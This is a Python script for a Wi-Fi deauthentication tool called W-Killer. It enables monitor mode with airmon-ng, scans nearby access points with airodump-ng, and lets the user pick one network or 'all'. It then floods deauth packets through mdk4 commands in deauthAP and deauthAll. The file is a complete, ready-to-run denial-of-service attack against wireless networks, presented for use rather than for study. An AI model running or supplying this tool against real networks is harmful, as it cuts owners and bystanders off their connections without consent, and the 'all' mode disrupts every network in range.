#!/usr/bin/env python3
from subprocess import Popen, PIPE, STDOUT
from scapy.all import (Dot11,RadioTap,Dot11Deauth,sendp,send)

import os
import re
import sys
import csv
import time
import signal
import subprocess
import cmd

# Terminal colors set
DEFAULT = '\033[39m'
BLACK = '\033[30m' 
RED = '\033[31m'
GREEN = '\033[32m'
ORANGE = '\033[93m'
BLUE = '\033[34m'
MAGENTA = '\033[95m'
CYAN = '\033[36m'

LIGHTGRAY = '\033[37m'
DARKGRAY = '\033[90m'
LIGHTRED = '\033[91m'
LIGHTGREEN = '\033[92m'
LIGHTORANGE = '\033[33m'
LIGHTBLUE = '\033[94m' 
LIGHTCYAN = '\033[96m'
LIGHTMAGENTA = '\033[35m'
WHITE = '\033[97m'
GRAY = '\033[30m'

banned_interfaces = ['eth','eth0','eth1','eth2','lo','lo0','lo1','lo2']

home = os.path.expanduser('~')
scanned_path = home+'/w-killer/scanned'
DN = open(os.devnull, 'w')
commands = []

if not os.path.exists(scanned_path):
    os.makedirs(scanned_path)


os.chdir(scanned_path)
os.system('clear')


def welcomeMsg():
    print(f"{LIGHTORANGE}Welcome")
    print(f"      {ORANGE}To")
    print('''
{2}   ██╗    ██╗      ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
{2}   ██║    ██║      ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
{2}   ██║ █╗ ██║█████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
{1}   ██║███╗██║╚════╝██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
{1}   ╚███╔███╔╝      ██║  ██╗██║███████╗███████╗███████╗██║  ██║
{1}    ╚══╝╚══╝       ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                           
                                                        {3}╔╗ ┬ ┬  ╔═╗╦╔═╔═╗╦ ╦
                                                 {0}───    {4}╠╩╗└┬┘  ╔═╝╠╩╗╠═╣║║║
    {0}-> {3}v1{0}.{4}3{0}                                             {3}╚═╝ ┴   ╚═╝╩ ╩╩ ╩╚╩╝
                                      {2}The possible is already done,
                                               {1}working on the impossible.'''.format(LIGHTGRAY, BLUE, CYAN, ORANGE, LIGHTORANGE))


def quitGracefully(clear=True):
    try:
        if clear == True:
            os.system('clear')
        os.system('stty sane') # unfreeze terminal
        print(f'\n{LIGHTGRAY}Thank you for using {CYAN}W{LIGHTGRAY}-{LIGHTBLUE}Killer{LIGHTGRAY}.\n'\
        f'{LIGHTORANGE}* {LIGHTGRAY}Stopping monitoring interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY})')
        cmd = ['airmon-ng','stop',monitor_interface]
        proc_restore = Popen(cmd, stdout=DN, stderr=DN)
        proc_restore.communicate()
        while proc_restore.wait == 1:
            continue
        proc_restore.kill()

        print(f'{LIGHTORANGE}* {LIGHTGRAY}Restarting {LIGHTORANGE}NetworkManager{LIGHTGRAY}')
        cmd = ['service','NetworkManager','restart']
        proc_restore = Popen(cmd, stdout=DN, stderr=DN)
        proc_restore.communicate()
        while proc_restore.wait == 1:
            continue
        proc_restore.kill()
    except KeyboardInterrupt:
        pass
    except:
        print(f'\n{LIGHTGRAY}Thank you for using {CYAN}W{LIGHTGRAY}-{LIGHTBLUE}Killer{LIGHTGRAY}.')
    print(f"{LIGHTGRAY}Don't forget to {GREEN}like {LIGHTGRAY}the repos on {CYAN}github {LIGHTGRAY}! :)")
    print(f"{LIGHTBLUE}* {GREEN}https://github.com/ZKAW/wifi-deauther")
    print(f'{LIGHTORANGE}Goodbye{LIGHTGRAY}.')
    exit(0)


def selectInterface():
    os.system('airmon-ng check kill') # disable if not working properly
    while True:
        try:
            os.system('clear')
            print('')
            welcomeMsg()

            monitor_interface = None
            interface_list = []
            count = -1
            for i in os.listdir("/sys/class/net/"):
                if i not in banned_interfaces:
                    count += 1
                    interface_list.append(i)
                    if i.find('mon') != -1:
                        print(f" {LIGHTGRAY}[{LIGHTORANGE}{count}{LIGHTGRAY}] {GREEN}{i.strip()}")
                    else:
                        print(f" {LIGHTGRAY}[{LIGHTORANGE}{count}{LIGHTGRAY}] {LIGHTGRAY}{i.strip()}")
            interface = int(input(f"\n{LIGHTGRAY}Select wifi {CYAN}interface {LIGHTGRAY}for {CYAN}monitoring {LIGHTGRAY}by number from the list above (ex: 0) > {LIGHTORANGE}"))
            interface = interface_list[interface]
            os.system('clear')
            print(f"\n  {CYAN}* {LIGHTGRAY}You selected {LIGHTORANGE}{interface}{LIGHTGRAY} for monitoring, waiting for monitor mode to enable...")
            for i in os.listdir("/sys/class/net/"):
                if i not in banned_interfaces:
                    if i.find('mon') != -1:
                        if i.find(interface) != -1:
                            monitor_interface = i
                            print(f"  {CYAN}* {LIGHTGRAY}Monitor interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY}) was already {GREEN}enabled{LIGHTGRAY}\n")
                            time.sleep(2)
                            break
                        
            if monitor_interface == None:
                try:
                    cmd = ['airmon-ng','start',interface]
                    proc_dump = Popen(cmd, stdout=DN, stderr=DN)
                    proc_dump.communicate()
                    while proc_dump.wait == 1:
                        continue
                    proc_dump.kill()
                    for i in os.listdir("/sys/class/net/"):
                        if i not in banned_interfaces:
                            if i.find('mon') != -1:
                                if i.find(interface) != -1:
                                    monitor_interface = i
                                    print(f"  {GREEN}* {LIGHTGRAY}Monitoring interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY}) has been {GREEN}enabled{LIGHTGRAY}\n")
                                    time.sleep(2)
                                    break
                                else:
                                    print(f'{RED}* {LIGHTGRAY}Error while enabling monitor interface, please {ORANGE}check {LIGHTGRAY}your {ORANGE}wifi {LIGHTGRAY}card {ORANGE}state {LIGHTGRAY}and try again')
                                    quitGracefully(clear=False)
                                    break

                except:
                    print(f'{RED}Error {LIGHTGRAY}while enabling monitor interface, please {ORANGE}check {LIGHTGRAY}your {ORANGE}wifi {LIGHTGRAY}card {ORANGE}state {LIGHTGRAY}and try again')
                    quitGracefully(clear=False)

            return monitor_interface
        except ValueError:
            os.system('clear')
            continue
        except IndexError:
            os.system('clear')
            continue
        except KeyboardInterrupt:
            quitGracefully()
            break


def scanAP(monitor_interface):
    cmd = ['airodump-ng',monitor_interface,'-w','scanned','--output-format','csv']
    for i in os.listdir(scanned_path):
        if 'scanned' in i:
            os.remove(i)
    proc_read = Popen(cmd, stdout=DN, stderr=DN)

    while os.path.exists(scanned_path+"/scanned-01.csv") == False:
        continue
    
    attempts_count = 0
    while True:
        try:
            os.system('clear')
            with open(scanned_path+'/scanned-01.csv') as csv_file:
                csv_reader = csv.reader(csv_file, delimiter=',')
                hit_clients = False
                ssid = None
                output_clients = ""
                bssid_list = []
                ssid_list = []
                channel_list = []
                count = -1

                if output_clients == "":
                    attempts_count += 1
                    print(f'\n  {CYAN}* {LIGHTGRAY}Starting {CYAN}scan {LIGHTGRAY}of {CYAN}APs {LIGHTGRAY}now...\n')
                    if attempts_count/2 > 15:
                        print(f"  {RED}* {LIGHTGRAY}Scanning time exceeded {CYAN}15sec{LIGHTGRAY}.\n"\
                              f"  {RED}* {LIGHTGRAY}Please consider {CYAN}restarting {LIGHTGRAY}the script,\n"\
                              f"  {RED}* {LIGHTGRAY}And {ORANGE}verifing {LIGHTGRAY}your {ORANGE}wifi {LIGHTGRAY}card {ORANGE}state{LIGHTGRAY}.")

                for row in csv_reader:
                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                            continue
                        if len(row) < 14:
                            continue
                        if row[0].strip() == 'BSSID':
                            continue
                        enc = row[5].strip()
                        if len(enc) > 4:
                            enc = enc[4:].strip()

                        bssid = row[0].strip()
                        power = str(row[8].strip())
                        channel = str(row[3].strip())
                        ssid = row[13].strip()
                        ssidlen = int(row[12].strip())
                        ssid = ssid[:ssidlen]
                        count += 1
                        if len(ssid) <= 20:
                            output_clients += f"   {LIGHTGRAY}[{LIGHTORANGE}{count}{LIGHTGRAY}] {BLUE}{ssid.ljust(20)} {CYAN}{channel.rjust(3)}  {LIGHTORANGE}{enc.ljust(4)} {CYAN}{power.rjust(4)}    {BLUE}{bssid.ljust(10)}{LIGHTGRAY}\n"
                        else:
                            output_clients += f"   {LIGHTGRAY}[{LIGHTORANGE}{count}{LIGHTGRAY}] {BLUE}{ssid[0:17]}... {CYAN}{channel.rjust(3)}  {LIGHTORANGE}{enc.ljust(4)} {CYAN}{power.rjust(4)}    {BLUE}{bssid.ljust(10)}{LIGHTGRAY}\n"
                        
                        bssid_list.append(bssid)
                        ssid_list.append(ssid)
                        channel_list.append(channel)

                    else:
                        if len(row) < 6:
                            continue
                if output_clients != "":
                    os.system('clear')
                    print(f'{LIGHTGRAY}Press {LIGHTORANGE}CTRL+C {LIGHTGRAY}when the target {BLUE}AP {LIGHTGRAY}appears\n')
                    print(f"{LIGHTGRAY}   NUM SSID                  CH  ENCR  POWER  BSSID")
                    print(f'{LIGHTGRAY}   --- --------------------  --  ----  -----  -----------------')
                    print(output_clients)
                csv_file.close()
            time.sleep(0.5) # Allow the user to press CTRL + C

        except KeyboardInterrupt:
            if ssid is None:
                os.system('clear')
                print(f"\n  {RED}* {LIGHTGRAY}Couldn't catch any {CYAN}AP{LIGHTGRAY}\n")
                time.sleep(2)
                quitGracefully()
            else:
                selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list)
            break

def selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list):
    proc_read.kill()
    os.system('stty sane') # unfreeze terminal
    os.system('clear')
    while True:
        try:
            print(f"{LIGHTGRAY}   NUM SSID                  CH  ENCR  POWER  BSSID")
            print(f'{LIGHTGRAY}   --- --------------------  --  ----  -----  -----------------')
            print(output_clients)
            target_id = input(f"{CYAN}Select {LIGHTGRAY}target {BLUE}AP {LIGHTGRAY}to {LIGHTORANGE}deauth {LIGHTGRAY}by number from the list above (ex: 0)\n"\
                                  f'Or type "{CYAN}all{LIGHTGRAY}" to {LIGHTORANGE}deauth {LIGHTGRAY}every nearby {CYAN}APs {LIGHTGRAY}> {LIGHTORANGE}')
            target_id = int(target_id)
            target_bssid = bssid_list[target_id]
            target_ssid = ssid_list[target_id]
            target_channel = channel_list[target_id]
            os.system('clear')
            print(f"\n  {GREEN}* {LIGHTGRAY}You selected {BLUE}{target_ssid} {LIGHTGRAY}({CYAN}{target_bssid}{LIGHTGRAY}) on channel {CYAN}{target_channel}{LIGHTGRAY}")
            deauthAP(target_bssid, target_ssid, target_channel, monitor_interface)
            break
        except ValueError:
            os.system('clear')
            if "all" in str(target_id).lower():
                print(f"\n  {GREEN}* {LIGHTGRAY}You selected to {LIGHTORANGE}deauth {LIGHTGRAY}every nearby {BLUE}APs{LIGHTGRAY}")
                deauthAll()
                break
            else:
                continue
        except IndexError:
            os.system('clear')
            continue
        except KeyboardInterrupt:
            quitGracefully()
            break

def deauthAP(bssid, ssid, channel, monitor_interface):
    try:
        os.system('airmon-ng check kill') # enable if not working properly
        os.system('clear')
        print(f'{LIGHTGRAY}Starting {LIGHTORANGE}deauth {LIGHTGRAY}attack for {BLUE}{ssid} {LIGHTGRAY}({CYAN}{bssid}{LIGHTGRAY})'\
              f' on channel {CYAN}{channel}{LIGHTGRAY}')
        print(f'{LIGHTGRAY}Press {LIGHTORANGE}CTRL+C {LIGHTGRAY}to {RED}STOP{LIGHTGRAY}\n')
        print(f'{CYAN}* {LIGHTGRAY}Flooding {CYAN}{bssid} {LIGHTGRAY}on channel {CYAN}{channel} {LIGHTGRAY}of {LIGHTORANGE}deauth {LIGHTGRAY}packets')

        cmd = f'mdk4 {monitor_interface} d -c {channel} -B {bssid}'
        os.popen(cmd).read()
    except KeyboardInterrupt:
        quitGracefully()
        exit(0)

def deauthAll():
    try:
        os.system('airmon-ng check kill') # enable if not working properly
        os.system('clear')
        print(f'{LIGHTGRAY}Starting {LIGHTORANGE}deauth {LIGHTGRAY}attack for {CYAN}every {LIGHTGRAY}nearby {BLUE}APs{LIGHTGRAY}')
        print(f'{LIGHTGRAY}Press {LIGHTORANGE}CTRL+C {LIGHTGRAY}to {RED}STOP{LIGHTGRAY}\n')
        print(f'{CYAN}* {LIGHTGRAY}Flooding {CYAN}all {LIGHTGRAY}channels {LIGHTGRAY}of {LIGHTORANGE}deauth {LIGHTGRAY}packets')

        cmd = f'mdk4 {monitor_interface} d'
        os.popen(cmd).read()
    except KeyboardInterrupt:
        quitGracefully()
        exit(0)


try:
    monitor_interface = selectInterface()
    scanAP(monitor_interface)
except Exception as e:
    print(f'\n{LIGHTGRAY}Following {RED}error {LIGHTGRAY}happened: {str(e)}\n')
    quitGracefully(clear=False)
